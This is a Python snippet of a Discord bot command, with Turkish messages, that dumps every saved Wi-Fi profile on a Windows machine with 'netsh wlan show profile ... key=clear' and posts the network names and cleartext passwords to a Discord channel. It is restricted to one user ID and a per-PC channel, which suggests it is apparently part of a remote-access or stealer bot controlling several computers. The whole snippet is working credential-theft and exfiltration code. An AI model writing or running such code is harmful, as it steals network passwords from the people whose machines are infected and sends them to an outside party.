@bot.command(name="wifi")
async def wifi(ctx):
    if ctx.author.id != ALLOWED_USER_ID:
        return
    if not check_pc_channel(ctx):
        await ctx.send("❌ Bu komut sadece kendi PC kanalında çalışır!")
        return
    try:
        result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await ctx.send("❌ Wi-Fi bilgileri alınamadı.")
            return
        profiles = re.findall(r"Tüm Kullanıcı Profilleri\s*:\s*(.+)", result.stdout)
        if not profiles:
            profiles = re.findall(r"All User Profile\s*:\s*(.+)", result.stdout)
        if not profiles:
            await ctx.send("❌ Kayıtlı Wi-Fi ağı bulunamadı.")
            return
        wifi_list = []
        for profile in profiles:
            profile = profile.strip()
            if profile:
                pwd_result = subprocess.run(
                    f'netsh wlan show profile "{profile}" key=clear',
                    shell=True, capture_output=True, text=True
                )
                sifre_match = re.search(r"Anahtar İçeriği\s*:\s*(.+)", pwd_result.stdout)
                if not sifre_match:
                    sifre_match = re.search(r"Key Content\s*:\s*(.+)", pwd_result.stdout)
                sifre = sifre_match.group(1).strip() if sifre_match else "Şifre yok"
                wifi_list.append(f"📶 **{profile}** → `{sifre}`")
        if wifi_list:
            msg = "**📶 Kayıtlı Wi-Fi Ağları ve Şifreleri:**\n" + "\n".join(wifi_list)
            if len(msg) > 1900:
                chunks = [msg[i:i+1900] for i in range(0, len(msg), 1900)]
                for chunk in chunks:
                    await ctx.send(chunk)
            else:
                await ctx.send(msg)
        else:
            await ctx.send("❌ Hiçbir Wi-Fi ağı bulunamadı.")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

